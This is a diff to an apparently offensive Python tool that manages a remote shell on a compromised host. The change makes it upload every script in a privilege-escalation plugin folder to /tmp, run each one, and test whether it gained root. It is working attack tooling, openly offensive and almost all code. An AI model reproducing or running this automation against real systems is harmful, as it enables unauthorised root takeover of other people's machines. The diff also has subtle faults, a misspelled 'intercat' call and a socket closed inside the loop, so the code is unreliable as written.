@@ -7,6 +7,7 @@ import socket
 import struct
 import random
 import base64
+import os
 
 def main(port, interface):
     persistent = False
@@ -20,18 +21,34 @@ def main(port, interface):
         sock = Socket(port, interface)
         sock.listen(hosts)
         shell = Shell(sock, persistent)
-        print('[+] Uploading privesc script')
-        rsh = RSH(sock)
-        rsh.upload('./plugins/privesc/plugin_privesc_sudo.sh', '/tmp/exploit.sh')
-        sock.send('chmod +x /tmp/exploit.sh\n')
-        sock.send('cd /tmp\n')
-        sock.send('./exploit.sh\n')
-        sock.send('id > /dev/null\n')
-        sock.send('id\n')
-        shell.interact()
-        sock.close()
+        print('[+] Identifying privesc capabilities')
+        sh = test_privesc(sock, shell)
+        sh.intercat()
+
     except KeyboardInterrupt:
         sock.close()
+
+def test_privesc(sock, shell):
+    directory = './plugins/privesc/'
+    counter = 1
+    for filename in os.listdir(directory):
+        f = os.path.join(directory, filename)
+        if os.path.isfile(f):
+            print('[+] Uploading privesc script number {}'.format(counter))
+            rsh = RSH(sock)
+            rsh.upload('{0}'.format(f), '/tmp/exploit{0}.sh'.format(counter))
+            sock.send('chmod +x /tmp/exploit{0}.sh\n'.format(counter))
+            sock.send('cd /tmp\n')
+            sock.send('./exploit{}.sh\n'.format(counter))
+            sock.send("""/bin/sh -c '[ "$(id)" = "uid=0(root) gid=0(root) groups=0(root)" ] && touch /tmp/valid_root'\n""")
+            rsh.file_exists('/tmp/valid_root')
+            if rsh.file_exists('/tmp/valid_root') == True:
+                sock.send('rm /tmp/valid_root\n')
+                return shell
+            shell.interact()
+            sock.close()
+            counter += 1
+
 
 def prompt(message):
     answer = ""
